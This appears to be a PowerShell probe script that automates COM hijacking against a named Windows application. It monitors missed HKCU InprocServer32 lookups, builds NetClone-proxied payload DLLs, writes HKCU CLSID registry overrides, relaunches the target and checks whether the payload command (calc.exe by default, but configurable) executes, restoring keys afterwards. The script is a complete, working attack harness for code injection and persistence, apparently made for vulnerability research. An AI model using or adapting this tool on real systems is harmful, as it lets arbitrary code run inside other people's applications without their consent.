param(
    [Parameter(Mandatory = $true)]
    [string]$AppName,

    [Parameter(Mandatory = $true)]
    [string]$ProcessName,

    [Parameter(Mandatory = $true)]
    [string]$LaunchExecutable,

    [string[]]$LaunchArgumentList = @(),
    [string[]]$TargetProcesses = @(),
    [string]$PayloadCommand = 'C:\Windows\System32\calc.exe',
    [string]$PackageId,
    [int]$CaptureSeconds = 20,
    [int]$TestWaitSeconds = 0,
    [int]$MaxCandidates = 0,
    [switch]$KillExisting,
    [switch]$CloseAfterEachTest = $true,
    [string]$WatcherPath,
    [string]$PayloadDll,
    [string]$NetClonePath,
    [string]$ArtifactsRoot,
    [string]$DatabasePath
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
$buildPayloadScript = Join-Path $scriptDirectory 'Build-KoppelingPayload.ps1'
. (Join-Path $scriptDirectory 'ComHijackHost.Common.ps1')
. (Join-Path $scriptDirectory 'ComHijackApp.Common.ps1')

if ([string]::IsNullOrWhiteSpace($WatcherPath)) {
    $WatcherPath = Join-Path $scriptDirectory "Watch-InProcServer32Misses.ps1"
}
if ([string]::IsNullOrWhiteSpace($ArtifactsRoot)) {
    $ArtifactsRoot = Join-Path $scriptDirectory "..\artifacts"
}
if ([string]::IsNullOrWhiteSpace($DatabasePath)) {
    $DatabasePath = Join-Path $scriptDirectory "..\data\com-hijack-findings.jsonl"
}

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-InprocKeyPath {
    param([string]$Clsid)
    return "Registry::HKEY_CURRENT_USER\Software\Classes\CLSID\$Clsid\InprocServer32"
}

function Get-HklmThreadingModel {
    param([string]$Clsid)

    $path = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\$Clsid\InprocServer32"
    try {
        return (Get-ItemProperty -LiteralPath $path -ErrorAction Stop).ThreadingModel
    } catch {
        return $null
    }
}

function Backup-HkcuInprocKey {
    param([string]$Clsid)

    $path = Get-InprocKeyPath -Clsid $Clsid
    $exists = Test-Path -LiteralPath $path
    if (-not $exists) {
        return [pscustomobject]@{
            Exists = $false
            DefaultValue = $null
            ThreadingModel = $null
        }
    }

    $item = Get-Item -LiteralPath $path -ErrorAction Stop
    return [pscustomobject]@{
        Exists = $true
        DefaultValue = $item.GetValue('', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
        ThreadingModel = $item.GetValue('ThreadingModel', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
    }
}

function Restore-HkcuInprocKey {
    param(
        [string]$Clsid,
        [psobject]$Backup
    )

    $path = Get-InprocKeyPath -Clsid $Clsid
    if (-not $Backup.Exists) {
        if (Test-Path -LiteralPath $path) {
            Remove-Item -LiteralPath $path -Recurse -Force
        }
        return
    }

    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -LiteralPath $path -Name '(default)' -Value $Backup.DefaultValue

    if ($null -eq $Backup.ThreadingModel) {
        try {
            Remove-ItemProperty -LiteralPath $path -Name 'ThreadingModel' -ErrorAction Stop
        } catch {
        }
    } else {
        Set-ItemProperty -LiteralPath $path -Name 'ThreadingModel' -Value $Backup.ThreadingModel
    }
}

function Set-HkcuOverride {
    param(
        [string]$Clsid,
        [string]$ProxyPath
    )

    $path = Get-InprocKeyPath -Clsid $Clsid
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -LiteralPath $path -Name '(default)' -Value $ProxyPath

    $threadingModel = Get-HklmThreadingModel -Clsid $Clsid
    if ([string]::IsNullOrWhiteSpace($threadingModel)) {
        $threadingModel = 'Both'
    }
    Set-ItemProperty -LiteralPath $path -Name 'ThreadingModel' -Value $threadingModel
}

function Normalize-ExecutableName {
    param([AllowNull()][string]$Name)

    return Normalize-ComHijackExecutableName -Name $Name
}

function Get-PayloadProcessNames {
    param([string]$Command)

    $token = $null
    if ($Command -match '^\s*"([^"]+)"') {
        $token = $matches[1]
    } elseif ($Command -match "^\s*'([^']+)'") {
        $token = $matches[1]
    } elseif ($Command -match '^\s*([^\s]+)') {
        $token = $matches[1]
    }

    $names = [System.Collections.Generic.List[string]]::new()
    if (-not [string]::IsNullOrWhiteSpace($token)) {
        $normalized = Normalize-ExecutableName -Name $token
        if (-not [string]::IsNullOrWhiteSpace($normalized)) {
            $names.Add([System.IO.Path]::GetFileNameWithoutExtension($normalized))
        }
    }

    if (@($names) -contains 'calc' -or @($names) -contains 'calculatorapp') {
        $names.Add('calc')
        $names.Add('calculatorapp')
    }

    return @($names | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Sort-Object -Unique)
}

function Get-PayloadProcessSnapshot {
    param([string[]]$Names)

    if (-not $Names -or $Names.Count -eq 0) {
        return @()
    }

    $results = foreach ($name in $Names) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Select-Object ProcessName, Id, MainWindowTitle
    }

    return @($results | Sort-Object Id -Unique)
}

$script:PayloadProcessNames = @(Get-PayloadProcessNames -Command $PayloadCommand)

function Get-CalcIds {
    return @(Get-PayloadProcessSnapshot -Names $script:PayloadProcessNames | Select-Object -ExpandProperty Id)
}

function Stop-CalcProcesses {
    foreach ($name in $script:PayloadProcessNames) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }

    if (@($script:PayloadProcessNames) -contains 'calc' -or @($script:PayloadProcessNames) -contains 'calculatorapp') {
        Get-Process ApplicationFrameHost -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Stop-TargetProcesses {
    param([string]$Name)
    Get-Process -Name $Name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

function Start-TargetProcess {
    param(
        [string]$FilePath,
        [string[]]$Arguments
    )

    if ($Arguments -and $Arguments.Count -gt 0) {
        return Start-Process -FilePath $FilePath -ArgumentList $Arguments -PassThru
    }

    return Start-Process -FilePath $FilePath -PassThru
}

function Get-ProcessTreeSnapshot {
    param([int]$RootProcessId)

    if ($RootProcessId -le 0) {
        return @()
    }

    $processes = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Select-Object ProcessId, ParentProcessId, Name)
    $results = [System.Collections.Generic.List[object]]::new()
    $visited = @{}
    $queue = [System.Collections.Generic.Queue[int]]::new()
    $queue.Enqueue($RootProcessId)

    while ($queue.Count -gt 0) {
        $currentPid = $queue.Dequeue()
        if ($visited.ContainsKey($currentPid)) {
            continue
        }

        $visited[$currentPid] = $true
        $current = @($processes | Where-Object { $_.ProcessId -eq $currentPid } | Select-Object -First 1)
        if ($current.Count -gt 0) {
            $results.Add([pscustomobject]@{
                Id = [int]$current[0].ProcessId
                ParentProcessId = [int]$current[0].ParentProcessId
                Name = [string]$current[0].Name
            })
        }

        foreach ($child in @($processes | Where-Object { $_.ParentProcessId -eq $currentPid })) {
            $queue.Enqueue([int]$child.ProcessId)
        }
    }

    return @($results)
}

function Stop-ProcessTree {
    param([int]$RootProcessId)

    $tree = @(Get-ProcessTreeSnapshot -RootProcessId $RootProcessId | Sort-Object Id -Descending)
    foreach ($entry in $tree) {
        Stop-Process -Id $entry.Id -Force -ErrorAction SilentlyContinue
    }
}

function Wait-ForNewCalcProcess {
    param(
        [int[]]$ExistingIds,
        [int]$TimeoutSeconds,
        [int]$PollMilliseconds = 250
    )

    if ($TimeoutSeconds -le 0) {
        return @()
    }

    $deadline = [DateTimeOffset]::UtcNow.AddSeconds($TimeoutSeconds)
    while ($true) {
        $calcNow = @(Get-PayloadProcessSnapshot -Names $script:PayloadProcessNames)
        $newCalc = @($calcNow | Where-Object { $ExistingIds -notcontains $_.Id })
        if ($newCalc.Count -gt 0) {
            return @($newCalc)
        }

        if ([DateTimeOffset]::UtcNow -ge $deadline) {
            return @()
        }

        Start-Sleep -Milliseconds $PollMilliseconds
    }
}

function Read-CaptureEvents {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        return @()
    }

    return @(Get-Content -LiteralPath $Path | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | ForEach-Object {
        try {
            $_ | ConvertFrom-Json
        } catch {
        }
    })
}

function Get-CollectionCount {
    param([AllowNull()][object]$InputObject)

    if ($null -eq $InputObject) {
        return 0
    }

    return [int](($InputObject | Measure-Object).Count)
}

function Get-CandidatesFromEvents {
    param(
        [object[]]$Events,
        [int]$Limit
    )

    $filtered = @($Events | Where-Object {
        $_ -and
        $_.PSObject.Properties['Clsid'] -and
        $_.PSObject.Properties['MachineInprocServer32'] -and
        $_.PSObject.Properties['Path'] -and
        $_.Clsid -and
        $_.MachineInprocServer32 -and
        $_.Path -match '\\REGISTRY\\USER\\'
    } | ForEach-Object {
        $candidateProcessName = $null
        if ($_.PSObject.Properties['ProcessName']) {
            $candidateProcessName = Normalize-ExecutableName -Name $_.ProcessName
        }

        [pscustomobject]@{
            Timestamp = $_.Timestamp
            ProcessId = $_.ProcessId
            ProcessName = $_.ProcessName
            CandidateProcessName = $candidateProcessName
            ThreadId = $_.ThreadId
            Operation = $_.Operation
            Status = $_.Status
            Clsid = $_.Clsid
            BaseName = $_.BaseName
            RelativeName = $_.RelativeName
            Path = $_.Path
            MachineInprocServer32 = $_.MachineInprocServer32
        }
    })

    $candidates = @($filtered |
        Group-Object {
            $candidateProcessName = if ([string]::IsNullOrWhiteSpace($_.CandidateProcessName)) { '' } else { [string]$_.CandidateProcessName }
            '{0}|{1}' -f $_.Clsid, $candidateProcessName
        } |
        ForEach-Object { $_.Group | Select-Object -First 1 })

    if ($Limit -gt 0) {
        return @($candidates | Select-Object -First $Limit)
    }

    return $candidates
}

function Get-CandidateSummariesFromEvents {
    param([object[]]$Events)

    $filtered = @($Events | Where-Object {
        $_ -and
        $_.PSObject.Properties['Clsid'] -and
        $_.PSObject.Properties['MachineInprocServer32'] -and
        $_.PSObject.Properties['Path'] -and
        $_.Clsid -and
        $_.MachineInprocServer32 -and
        $_.Path -match '\\REGISTRY\\USER\\'
    })

    return @($filtered |
        Group-Object Clsid |
        ForEach-Object {
            $group = $_.Group
            $observedProcessNames = @($group |
                Where-Object { $_.PSObject.Properties['ProcessName'] -and -not [string]::IsNullOrWhiteSpace($_.ProcessName) } |
                Select-Object -ExpandProperty ProcessName -Unique |
                ForEach-Object { Normalize-ExecutableName -Name $_ } |
                Where-Object { -not [string]::IsNullOrWhiteSpace($_) } |
                Sort-Object -Unique)

            [pscustomobject]@{
                Clsid                = $group[0].Clsid
                MachineInprocServer32 = $group[0].MachineInprocServer32
                HitCount             = $group.Count
                FirstSeen            = $group[0].Timestamp
                LastSeen             = $group[$group.Count - 1].Timestamp
                ObservedProcessNames = $observedProcessNames
                ObservedProcessNamesText = ($observedProcessNames -join ';')
            }
        } |
        Sort-Object -Property @{ Expression = 'HitCount'; Descending = $true }, @{ Expression = 'Clsid'; Descending = $false })
}

function Write-CandidateArtifacts {
    param(
        [string]$ArtifactDirectory,
        [string]$AppName,
        [object[]]$Events,
        [object[]]$CandidateSummaries
    )

    $candidatesJsonPath = Join-Path $ArtifactDirectory 'candidates.json'
    $candidatesCsvPath = Join-Path $ArtifactDirectory 'candidates.csv'
    $summaryTextPath = Join-Path $ArtifactDirectory 'summary.txt'

    $usableEvents = @($Events | Where-Object {
        $_ -and
        $_.PSObject.Properties['Clsid'] -and
        $_.PSObject.Properties['MachineInprocServer32'] -and
        $_.PSObject.Properties['Path'] -and
        $_.Clsid -and
        $_.MachineInprocServer32 -and
        $_.Path -match '\\REGISTRY\\USER\\'
    })
    $topDlls = @($usableEvents |
        Group-Object MachineInprocServer32 |
        Sort-Object Count -Descending |
        Select-Object -First 10)

    $CandidateSummaries | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $candidatesJsonPath
    $CandidateSummaries | Export-Csv -LiteralPath $candidatesCsvPath -NoTypeInformation

    $eventCount = Get-CollectionCount -InputObject $Events
    $usableEventCount = Get-CollectionCount -InputObject $usableEvents
    $candidateSummaryCount = Get-CollectionCount -InputObject $CandidateSummaries
    $topDllSummaryLines = @($topDlls | ForEach-Object {
        $hasCountProperty = $_.PSObject.Properties.Match('Count').Count -gt 0
        $hasGroupProperty = $_.PSObject.Properties.Match('Group').Count -gt 0
        $hitCount = if ($hasCountProperty -and $null -ne $_.Count) {
            [int]$_.Count
        } elseif ($hasGroupProperty) {
            Get-CollectionCount -InputObject $_.Group
        } else {
            0
        }

        '{0} | hits={1}' -f $_.Name, $hitCount
    })

    $summaryLines = @(
        'App: {0}' -f $AppName,
        'Total events: {0}' -f $eventCount,
        'Backed candidate hits: {0}' -f $usableEventCount,
        'Unique candidates: {0}' -f $candidateSummaryCount,
        '',
        'Top DLLs:'
    ) + $topDllSummaryLines

    Set-Content -LiteralPath $summaryTextPath -Value $summaryLines

    return [pscustomobject]@{
        CandidatesJsonPath = $candidatesJsonPath
        CandidatesCsvPath  = $candidatesCsvPath
        SummaryPath        = $summaryTextPath
    }
}

function Get-FullValidationPrerequisites {
    param(
        [AllowNull()][string]$PreferredNetClonePath,
        [AllowNull()][string]$PreferredPayloadDll
    )

    $missing = [System.Collections.Generic.List[string]]::new()
    $resolvedKoppelingRoot = $null
    $resolvedNetClonePath = $null

    $needsKoppelingRoot = [string]::IsNullOrWhiteSpace($PreferredPayloadDll) -or [string]::IsNullOrWhiteSpace($PreferredNetClonePath)
    if ($needsKoppelingRoot) {
        try {
            $resolvedKoppelingRoot = Resolve-ComHijackKoppelingRoot -ScriptDirectory $scriptDirectory -RequiredRelativePath 'Theif\Theif.vcxproj' -HydrateIfMissing
        } catch {
            $missing.Add($_.Exception.Message)
        }
    }

    if ([string]::IsNullOrWhiteSpace($PreferredNetClonePath)) {
        if (-not [string]::IsNullOrWhiteSpace($resolvedKoppelingRoot)) {
            $candidateNetClonePath = Join-Path $resolvedKoppelingRoot 'Bin\NetClone.exe'
            if (-not (Test-Path -LiteralPath $candidateNetClonePath)) {
                $seeded = Install-ComHijackPackagedNetCloneRuntime -KoppelingRoot $resolvedKoppelingRoot -ScriptDirectory $scriptDirectory
                if (-not $seeded) {
                    $missing.Add('NetClone.exe is unavailable for the hydrated Koppeling checkout.')
                }
            }

            if (Test-Path -LiteralPath $candidateNetClonePath) {
                $resolvedNetClonePath = $candidateNetClonePath
            }
        }
    } else {
        $candidateNetClonePath = [System.IO.Path]::GetFullPath($PreferredNetClonePath)
        if (-not (Test-Path -LiteralPath $candidateNetClonePath)) {
            $missing.Add("Requested NetClone path not found: $PreferredNetClonePath")
        } else {
            $resolvedNetClonePath = $candidateNetClonePath
        }
    }

    if ([string]::IsNullOrWhiteSpace($PreferredPayloadDll)) {
        try {
            $visualStudio = Get-ComHijackVisualStudioInstall
            if ([string]::IsNullOrWhiteSpace($visualStudio.CompilerPath)) {
                $missing.Add('Missing x64 C++ compiler. Install Visual Studio 2022 Build Tools with the Desktop development with C++ workload.')
            }
        } catch {
            $missing.Add($_.Exception.Message)
        }

        if ([string]::IsNullOrWhiteSpace((Get-ComHijackWindowsSdkLibraryPath))) {
            $missing.Add('Missing Windows SDK x64 libraries. Install Visual Studio 2022 Build Tools with the Desktop development with C++ workload.')
        }
    }

    return [pscustomobject]@{
        KoppelingRoot       = $resolvedKoppelingRoot
        NetClonePath        = $resolvedNetClonePath
        MissingPrerequisites = @($missing | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Sort-Object -Unique)
    }
}

function Get-ObservedTargetProcesses {
    param(
        [object[]]$Events,
        [string[]]$Fallback
    )

    $names = @($Events |
        Where-Object { $_ -and $_.PSObject.Properties['ProcessName'] -and -not [string]::IsNullOrWhiteSpace($_.ProcessName) } |
        Select-Object -ExpandProperty ProcessName -Unique |
        ForEach-Object { Normalize-ExecutableName -Name $_ } |
        Where-Object { -not [string]::IsNullOrWhiteSpace($_) } |
        Sort-Object -Unique)

    if ($names.Count -gt 0) {
        return $names
    }

    return @($Fallback |
        ForEach-Object { Normalize-ExecutableName -Name $_ } |
        Where-Object { -not [string]::IsNullOrWhiteSpace($_) } |
        Sort-Object -Unique)
}

function Get-TasklistModuleMatches {
    param([string]$TasklistText)

    $parsed = @()
    foreach ($line in ($TasklistText -split "`r?`n")) {
        if ($line -match '^\s*([^\s]+)\s+(\d+)\s+') {
            $parsed += [pscustomobject]@{
                ImageName = [string]$Matches[1]
                Id = [int]$Matches[2]
            }
        }
    }

    return @($parsed)
}

function New-ProxyDll {
    param(
        [string]$Clsid,
        [string]$ReferenceDll,
        [string]$PayloadPath,
        [string]$NetCloneExe,
        [string]$ProxyDirectory
    )

    $proxyName = '{0}.dll' -f $Clsid.Trim('{}').Replace('-', '').ToLowerInvariant()
    $proxyPath = Join-Path $ProxyDirectory $proxyName
    Copy-Item -LiteralPath $PayloadPath -Destination $proxyPath -Force

    & $NetCloneExe --target $proxyPath --output $proxyPath --reference $ReferenceDll | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "NetClone failed for $Clsid using $ReferenceDll"
    }

    return $proxyPath
}

function Append-DatabaseRow {
    param(
        [string]$Path,
        [psobject]$Row
    )

    $directory = Split-Path -Parent $Path
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory | Out-Null
    }

    Add-Content -LiteralPath $Path -Value ($Row | ConvertTo-Json -Compress)
}

if (-not (Test-IsAdministrator)) {
    throw 'Invoke-ComHijackProbe.ps1 must run from an elevated PowerShell session.'
}

if ($TestWaitSeconds -le 0) {
    $TestWaitSeconds = $CaptureSeconds
}

foreach ($requiredPath in @($WatcherPath, $PayloadDll, $NetClonePath, $LaunchExecutable)) {
    if (-not [string]::IsNullOrWhiteSpace($requiredPath)) {
        $resolved = [System.IO.Path]::GetFullPath($requiredPath)
        if (-not (Test-Path -LiteralPath $resolved)) {
            throw "Required path not found: $requiredPath"
        }
    }
}

if (-not (Test-Path -LiteralPath $buildPayloadScript)) {
    throw "Required path not found: $buildPayloadScript"
}

$timestamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$artifactDirectory = Join-Path $ArtifactsRoot ("{0}-{1}" -f $AppName, $timestamp)
$proxyDirectory = Join-Path $artifactDirectory 'proxies'
$resultsPath = Join-Path $artifactDirectory 'results.json'
$capturePath = Join-Path $artifactDirectory 'capture.jsonl'
$captureErrorPath = Join-Path $artifactDirectory 'capture.stderr.txt'
$observedProcessesPath = Join-Path $artifactDirectory 'observed-processes.json'
$candidatesJsonPath = Join-Path $artifactDirectory 'candidates.json'
$candidatesCsvPath = Join-Path $artifactDirectory 'candidates.csv'
$summaryTextPath = Join-Path $artifactDirectory 'summary.txt'
$rootProcessName = [System.IO.Path]::GetFileName($LaunchExecutable)
New-Item -ItemType Directory -Force -Path $proxyDirectory | Out-Null

if ($KillExisting) {
    Stop-TargetProcesses -Name $ProcessName
}

Stop-CalcProcesses
$captureLaunch = Start-TargetProcess -FilePath $LaunchExecutable -Arguments $LaunchArgumentList
Start-Sleep -Milliseconds 500
$watchOutput = & "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
    -NoProfile `
    -ExecutionPolicy Bypass `
    -File $WatcherPath `
    -RootProcessId $captureLaunch.Id `
    -IncludeDescendants `
    -ResolveProcessName `
    -DurationSeconds $CaptureSeconds 2> $captureErrorPath
$watchExitCode = $LASTEXITCODE
$watchOutput | Set-Content -LiteralPath $capturePath
if ($watchExitCode -ne 0) {
    $watcherError = if (Test-Path -LiteralPath $captureErrorPath) { (Get-Content -LiteralPath $captureErrorPath -Raw).Trim() } else { '' }
    throw "Watcher failed with exit code $watchExitCode. $watcherError"
}
Stop-ProcessTree -RootProcessId $captureLaunch.Id

$events = Read-CaptureEvents -Path $capturePath
$observedTargetProcesses = @(Get-ObservedTargetProcesses -Events $events -Fallback ($TargetProcesses + @($rootProcessName)))
[pscustomobject]@{
    RootProcessName = $rootProcessName
    ObservedProcessNames = $observedTargetProcesses
} | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $observedProcessesPath

$candidateSummaries = @(Get-CandidateSummariesFromEvents -Events $events)
$candidateArtifacts = Write-CandidateArtifacts -ArtifactDirectory $artifactDirectory -AppName $AppName -Events $events -CandidateSummaries $candidateSummaries
$candidateHitCountByClsid = @{}
foreach ($summary in $candidateSummaries) {
    $candidateHitCountByClsid[$summary.Clsid] = [int]$summary.HitCount
}

$fullValidation = Get-FullValidationPrerequisites -PreferredNetClonePath $NetClonePath -PreferredPayloadDll $PayloadDll
if (@($candidateSummaries).Count -eq 0 -or $fullValidation.MissingPrerequisites.Count -gt 0) {
    $discoveryRows = @($candidateSummaries | ForEach-Object {
        [pscustomobject]@{
            Mode                 = 'DiscoveryOnly'
            AppName              = $AppName
            PackageId            = $PackageId
            ProcessName          = $ProcessName
            RootProcessName      = $rootProcessName
            Clsid                = $_.Clsid
            MachineInprocServer32 = $_.MachineInprocServer32
            HitCount             = $_.HitCount
            FirstSeen            = $_.FirstSeen
            LastSeen             = $_.LastSeen
            ObservedProcessNames = $_.ObservedProcessNames
            CapturePath          = $capturePath
            CandidatesPath       = $candidatesJsonPath
            CandidatesCsvPath    = $candidatesCsvPath
            SummaryPath          = $summaryTextPath
            MissingPrerequisites = @($fullValidation.MissingPrerequisites)
        }
    })

    if ($discoveryRows.Count -eq 0) {
        $discoveryRows = @([pscustomobject]@{
            Mode                 = 'DiscoveryOnly'
            AppName              = $AppName
            PackageId            = $PackageId
            ProcessName          = $ProcessName
            RootProcessName      = $rootProcessName
            Clsid                = $null
            MachineInprocServer32 = $null
            HitCount             = 0
            FirstSeen            = $null
            LastSeen             = $null
            ObservedProcessNames = $observedTargetProcesses
            CapturePath          = $capturePath
            CandidatesPath       = $candidatesJsonPath
            CandidatesCsvPath    = $candidatesCsvPath
            SummaryPath          = $summaryTextPath
            MissingPrerequisites = @($fullValidation.MissingPrerequisites)
        })
    }

    $discoveryRows | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $resultsPath
    $discoveryRows
    return
}

$NetClonePath = $fullValidation.NetClonePath
$candidates = Get-CandidatesFromEvents -Events $events -Limit $MaxCandidates
$results = @()
$payloadCache = @{}

foreach ($candidate in $candidates) {
    $backup = Backup-HkcuInprocKey -Clsid $candidate.Clsid
    $proxyPath = $null
    $tasklistText = ''
    $testLaunch = $null
    $candidateProcessName = if ([string]::IsNullOrWhiteSpace($candidate.CandidateProcessName)) { Normalize-ExecutableName -Name $rootProcessName } else { [string]$candidate.CandidateProcessName }
    $candidatePayloadDll = $PayloadDll

    try {
        if ([string]::IsNullOrWhiteSpace($candidatePayloadDll)) {
            if (-not $payloadCache.ContainsKey($candidateProcessName)) {
                $builtPayload = & $buildPayloadScript -TargetProcesses @($candidateProcessName) -PayloadCommand $PayloadCommand -KoppelingRoot $fullValidation.KoppelingRoot
                $payloadCache[$candidateProcessName] = $builtPayload.FullName
            }

            $candidatePayloadDll = [string]$payloadCache[$candidateProcessName]
        }

        $proxyPath = New-ProxyDll -Clsid $candidate.Clsid -ReferenceDll $candidate.MachineInprocServer32 -PayloadPath $candidatePayloadDll -NetCloneExe $NetClonePath -ProxyDirectory $proxyDirectory
        Set-HkcuOverride -Clsid $candidate.Clsid -ProxyPath $proxyPath

        if ($KillExisting) {
            Stop-TargetProcesses -Name $ProcessName
        }

        $calcBefore = Get-CalcIds
        $testLaunch = Start-TargetProcess -FilePath $LaunchExecutable -Arguments $LaunchArgumentList
        $newCalc = @(Wait-ForNewCalcProcess -ExistingIds $calcBefore -TimeoutSeconds $TestWaitSeconds)
        $testTree = @(Get-ProcessTreeSnapshot -RootProcessId $testLaunch.Id)
        $testTreeIds = @($testTree | Select-Object -ExpandProperty Id)
        $tasklistText = (tasklist /m ([System.IO.Path]::GetFileName($proxyPath))) | Out-String
        $moduleMatches = @(Get-TasklistModuleMatches -TasklistText $tasklistText)
        $matchingProxyProcesses = @($moduleMatches | Where-Object { $testTreeIds -contains $_.Id })
        $observedProcessName = $null
        if ($matchingProxyProcesses.Count -gt 0) {
            $matchingCandidateProcess = @($matchingProxyProcesses | Where-Object {
                (Normalize-ExecutableName -Name $_.ImageName) -eq $candidateProcessName
            })
            if ($matchingCandidateProcess.Count -gt 0) {
                $observedProcessName = Normalize-ExecutableName -Name $matchingCandidateProcess[0].ImageName
            } else {
                $observedProcessName = Normalize-ExecutableName -Name $matchingProxyProcesses[0].ImageName
            }
        } else {
            $observedProcessName = $candidateProcessName
        }
        $proxySeen = $tasklistText -notmatch 'No tasks are running'

        $row = [pscustomobject]@{
            Mode = 'FullValidation'
            Timestamp = (Get-Date).ToString('o')
            AppName = $AppName
            PackageId = $PackageId
            ProcessName = $ProcessName
            RootProcessName = $rootProcessName
            ObservedProcessName = $observedProcessName
            IsChildProcess = (-not [string]::IsNullOrWhiteSpace($observedProcessName) -and -not $observedProcessName.Equals($rootProcessName, [System.StringComparison]::OrdinalIgnoreCase))
            Clsid = $candidate.Clsid
            MachineInprocServer32 = $candidate.MachineInprocServer32
            CandidateHitCount = if ($candidateHitCountByClsid.ContainsKey($candidate.Clsid)) { [int]$candidateHitCountByClsid[$candidate.Clsid] } else { $null }
            CapturePath = $capturePath
            CandidatesPath = $candidatesJsonPath
            CandidatesCsvPath = $candidatesCsvPath
            SummaryPath = $summaryTextPath
            ProxyPath = $proxyPath
            CalcLaunched = (@($newCalc).Count -gt 0)
            CalcProcesses = $newCalc
            ProxyModuleSeen = $proxySeen
            ProxyModuleTasklist = $tasklistText.TrimEnd()
        }

        $results += $row
        Append-DatabaseRow -Path $DatabasePath -Row $row
    } finally {
        Restore-HkcuInprocKey -Clsid $candidate.Clsid -Backup $backup

        if ($CloseAfterEachTest -and $null -ne $testLaunch) {
            Stop-ProcessTree -RootProcessId $testLaunch.Id
        }

        Stop-CalcProcesses
    }
}

$results | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $resultsPath
$results
